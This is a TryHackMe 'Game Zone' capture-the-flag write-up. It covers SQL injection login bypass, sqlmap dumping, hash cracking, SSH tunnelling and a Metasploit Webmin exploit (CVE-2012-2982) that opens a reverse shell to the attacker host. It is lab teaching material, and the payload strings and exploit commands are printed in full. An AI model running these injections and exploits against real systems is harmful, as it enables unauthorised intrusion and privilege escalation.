---
title: THM - Game Zone
date: 2022-08-15
categories: [TryHackMe, Rooms]
tags: [tryhackme, sqli, ssh, privesc, hash, metasploit, cve]
---

4th challenge of the _Advanced Exploitation_ module called __Game Zone__.

On the introduction of the challenge we can read that we will use some SQL injection manually then using SQLMap. Plus we will do some password cracking, manipulating SSH tunnels to reveal a hidden service and use Metasploit to gain root privileges.

First thing to do: deploy the machine.

>For this writeup I will say that the IP adresses are the following:
>
> - __attack machine__ is `10.10.10.1`
>
> - __target machine__ is `10.10.10.2`
{: .prompt-warning }

# Task #1 - Deploy the vulnerable machine

Now the machine is online we can start doing some port enumeration with ``nmap``.

We will do a basic scan like:

````bash
nmap -sC -sV -vv 10.10.10.2
````

Little explanation of the options :
-sC
: Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some of the scripts in this category are considered intrusive and should not be run against a target network without permission.

-sV
: Enables version detection

-vv
: Max verbosity level

After few minutes we can see two interesting running services :

- Port 80 : http server named 'Game Zone'
- Port 22 : ssh OpenSSH 7.2p2

Let's see the web server first.

We can easily identify Hitman on the landing page but I don't kow his real name. After googling it :

> What is the name of the large cartoon avatar holding a sniper on the forum?
>
> __agent 47__
{: .prompt-tip }

# Task #2 - Obtain access via SQLi

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

````sql
SELECT * FROM users WHERE username = my_password AND password = my_password
````

Because we don't have a valid username/password pair we will try to bybass the authentication form using SQL injection.

In the login field I write ``username = ' or 1=1 -- -``

Instead of giving a username and a password to the form I simply escape the username input using the `'` because strings are always stored between `' '` or `" "`. Then I add the condition ``or 1=1`` and comment all the rest of the query with the double dashes ``--``.

>In simple words it will say to the database:  
>
> __If 1=1 the user is authenticated__.
{: .prompt-info }

> When you've logged in, what page do you get redirected to?
>
> __portal.php__
{: .prompt-tip }

# Task #3 - Using SQLMap

We will use SQLMap to dump all the database info.
We first have to capture a request within Burp of the search bar in portal.php

You can put anything you want in the search bar and intercept the request.
Copy all the raw body in a text file (req.txt for exemple). To make it works I had to remove all the blank lines of the file except the one before __searchitem__ (the last line)

Now we can use SQLMap like this

````bash
sqlmap -r req.txt --dbms=mysql --dump
````

Where:
--r
: specifies a file containin the request

---dbms
: specifies which Database Management System is used by the website

---dump
: Dump DBMS database table entries

Here it's said that the dbms is MySQL but in real cases we would have to do some enumeration to identify it.

Now we have to wait a moment for SQLMap to finish. If asked to extend the tests for MySQL answer ``Y``. If asked anything else you can answer ``y``.

When SQLMap finished we can see 2 tables in the database : __users__ and __post__.
In _users_ SQLMap found just one entry and gave us the hashed password and the username related.

> In the users table, what is the hashed password?
>
> __If you followed the steps it should appears on your screen when SQLMap ends.__
{: .prompt-tip }

> What was the username associated with the hashed password?
>
> __agent47__
{: .prompt-tip }

>What was the other table name?
>
> __post__
{: .prompt-tip }

# Task #4 - Cracking a password with JohnTheRipper

Now that we have a username and a hashed password we can try to crack the hash to reveal it.
for This we will use John The Ripper a 15y old very famous cracking program.

The basic command is the following :

````bash
john @hash --wordlist=@wordlist --format=@format
````

- @hash
: the file containing the hash(es) (hash.txt for exemple)
- @wordlist
: the worlist (rockyou.txt for exemple)
- @format
: the hash(es) type (md5crypt for exemple)

>To list all the supported formats by john you can use the following command:
>
> ``john --list=formats``
{: .prompt-info }

Before using john we first have to identify the hashtype of the discovered hash.
For this there are many websites which can help you finding the type, I personally use [__Tunnels UP__](https://www.tunnelsup.com/hash-analyzer/).

After finding the good hash format we can now launch ``john``.

In few seconds we obtain the password.

>What is the de-hashed password?
>
> __if you followed the previous steps _john_ should give it to you very quickly__
{: .prompt-tip }

We can now try to log into the machine using ssh

````bash
ssh agent47@10.10.10.2
````

>What is the user flag?.
>
> __Just ``ls`` and the flag is there.__
{: .prompt-tip }

# Task #5 - Exposing services with reverse SSH tunnels

Now using a tool called ``ss`` we will look at the running sockets on the victim machine.

````console
agent47@gamezone:~$ ss -tulnp
Netid  State      Recv-Q Send-Q                  Local Address:Port                                 Peer Address:Port              
udp    UNCONN     0      0                                   *:10000                                           *:*                  
udp    UNCONN     0      0                                   *:68                                              *:*                  
tcp    LISTEN     0      128                                 *:10000                                           *:*                  
tcp    LISTEN     0      128                                 *:22                                              *:*                  
tcp    LISTEN     0      80                          127.0.0.1:3306                                            *:*                  
tcp    LISTEN     0      128                                :::80                                             :::*                  
tcp    LISTEN     0      128                                :::22                                             :::*      
````

Here are the detailed options:
--t
: Display TCP sockets

--u
: Display UDP sockets

--l
: Displays only listening sockets

--n
: Doesn't resolve service names

--p
: Shows the process using the socket

>How many TCP sockets are running?
>
> __5__
{: .prompt-tip }

We can identify a service running on port ``10000`` but can't be accessed from outside because blocked by a firewall.

We will use a ssh tunnel from our mmachine to redirect the traffic of the blocked service to our localhost interface. Thus we will be able to see and interact with the blocked content.

````bash
ssh -L 10000:localhost:10000 agent47@10.10.10.2
firefox localhost:10000 &
````

If it works we should arrive to a login page where you can instantly identify the CMS used.

>What is the name of the exposed CMS?
>
> __Webmin__
{: .prompt-tip }

Now we need to find the credentials to access the admin panel.

I first tried ``admin:admin`` in the login form but it failed.
Then I looked on internet for the default creds and they said it's the root user (thus the user we are logged in with ssh).

When logged in it is not hard to find the CMS version.

>What is the CMS version?
>
> __1.580__
{: .prompt-tip }

# Tasks #6 - Privilege escalation with Metasploit

We have a CMS name and a version. Now time to look for vulnerabilities.

After some researches I found that this server was vulnerable to a CVE : __CVE-2012-2982__.

Let's play with ``metasploit``.

````console
$ msfconsole -q
msf5 > search CVE-2012-2982

Matching Modules
================
   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
````

````console
msf5 > use 0
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580
````

````console
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set LHOST 10.10.10.1
LHOST => 10.10.10.1
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set RPORT 10000
RPORT => 10000
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
username => agent47
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
PASSWORD => videogamer124
````

Now everything is set we can run it.

````console
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > run

[*] Started reverse TCP double handler on 10.10.10.1:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 7Fb8i0Az0Jq2XHQd;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "7Fb8i0Az0Jq2XHQd\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.10.10.1:4444 -> 10.10.105.217:50912) at 2022-08-17 17:43:52 +0100

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
````

>What is the root flag?
>
> __Execute ``cat /root/root.txt`` and you will get it__
{: .prompt-tip }

# Conclusion

A cool challenge introducing SSH tunnels with a mix of web and privesc.
